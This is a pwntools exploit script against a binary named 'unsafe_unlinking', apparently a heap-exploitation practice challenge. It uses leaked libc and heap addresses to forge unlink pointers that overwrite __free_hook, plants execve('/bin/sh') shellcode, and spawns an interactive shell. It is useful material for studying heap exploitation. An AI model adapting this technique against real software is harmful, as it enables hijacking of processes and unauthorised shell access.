 #!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("unsafe_unlinking")
libc = elf.libc
index = 0

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

def malloc(size):
    global index
    io.recvuntil("your option is: ")
    io.timeout = 0.1
    io.send("1")
    io.sendafter("malloc size(hexadecimal): ", hex(size))
    index += 1
    return index - 1 

def edit(index, data):
    io.recvuntil("your option is: ")
    io.timeout = 0.1
    io.send("2")
    io.sendafter("chunk index: ", str(index))
    io.sendafter("input data: ", data)

def free(i):
    io.recvuntil("your option is: ")
    io.timeout = 0.1
    io.send("3")
    global index
    io.sendafter("index: ", str(i).encode())


io = start()
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)



shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:"+ shellcraft.execve("/bin/sh"))
shellcode_addr = heap + 0x20

chunk_a = malloc(0x88)
chunk_b = malloc(0x88)


fd          = libc.sym.__free_hook - 0x18
bk          = shellcode_addr
prev_size    = 0x90
fake_size   = 0x90

edit(chunk_a, p64(fd) + p64(bk) + shellcode + b'a'*(0x88- len(shellcode) - 0x18) + p64(prev_size) + p64(fake_size))

free(chunk_b)
free(chunk_a)


io.interactive()
